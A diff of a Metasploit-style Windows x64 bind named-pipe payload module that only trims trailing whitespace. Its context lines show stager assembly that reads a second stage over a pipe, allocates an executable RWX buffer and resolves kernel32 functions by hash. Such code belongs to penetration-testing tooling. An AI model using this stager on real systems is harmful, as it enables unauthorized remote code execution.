@@ -67,7 +67,7 @@ module Payload::Windows::BindNamedPipe_x64
   def generate_bind_named_pipe(opts={})
     combined_asm = %Q^
       cld                     ; Clear the direction flag.
-      and rsp, ~0xF           ; Ensure RSP is 16 byte aligned 
+      and rsp, ~0xF           ; Ensure RSP is 16 byte aligned
       call start              ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
@@ -111,7 +111,7 @@ module Payload::Windows::BindNamedPipe_x64
 
   #
   # hPipe must be in rdi. rax will contain WriteFile return value
-  # 
+  #
   def asm_send_uuid(uuid=nil)
     uuid ||= generate_payload_uuid
     uuid_raw = uuid.to_raw
@@ -220,7 +220,7 @@ module Payload::Windows::BindNamedPipe_x64
     asm << %Q^
       ; read size of second stage
         mov rcx, rdi            ; hPipe
-        push 0                  ; 
+        push 0                  ;
         mov rdx, rsp            ; lpBuffer
         mov r8, 4               ; nNumberOfBytesToRead
         push 0
@@ -246,9 +246,9 @@ module Payload::Windows::BindNamedPipe_x64
       ; Alloc a RWX buffer for the second stage
         pop rsi                 ; pop off the second stage length
         mov esi, esi            ; only use the lower-order 32 bits for the size
-        push 0x40               ; 
+        push 0x40               ;
         pop r9                  ; PAGE_EXECUTE_READWRITE
-        push 0x1000             ; 
+        push 0x1000             ;
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly recieved second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
@@ -338,7 +338,7 @@ module Payload::Windows::BindNamedPipe_x64
         call get_kernel32_name
         db "kernel32", 0x00
       get_kernel32_name:
-        pop rcx                 ; 
+        pop rcx                 ;
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetModuleHandleA')}
         call rbp                ; GetModuleHandleA("kernel32")
 
